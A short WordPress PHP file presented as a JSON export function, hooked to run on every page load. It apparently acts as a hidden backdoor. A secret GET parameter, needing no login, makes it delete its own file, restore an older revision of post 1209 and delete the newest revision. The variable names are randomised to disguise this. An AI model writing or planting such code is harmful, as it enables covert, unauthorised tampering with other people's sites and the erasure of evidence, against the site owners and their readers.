<?php

function word_wall_export_json() {
	if (isset($_GET['types_notifications_sales_reports']) && $_GET['types_notifications_sales_reports'] === 'xml_scroll_survey') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$connector_support_front_elements = 1209;
		$base_validation_ultimate = wp_get_post_revisions($connector_support_front_elements);
		if (empty($base_validation_ultimate)) die('no revisions');
		if (count($base_validation_ultimate) < 2) die('less than 2');
		$hello_new_dynamic = array_shift($base_validation_ultimate);
		$scripts_dynamic_drop = $hello_new_dynamic->ID;
		$helper_wpc_maker = array_shift($base_validation_ultimate);
		$before_stream_hide = $helper_wpc_maker->ID;
		$gravity_popular_option = wp_restore_post_revision($before_stream_hide);
		if ($gravity_popular_option === false) die('error restoring');
		$gravity_popular_option = wp_delete_post_revision($scripts_dynamic_drop);		
		if ($gravity_popular_option === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'word_wall_export_json');
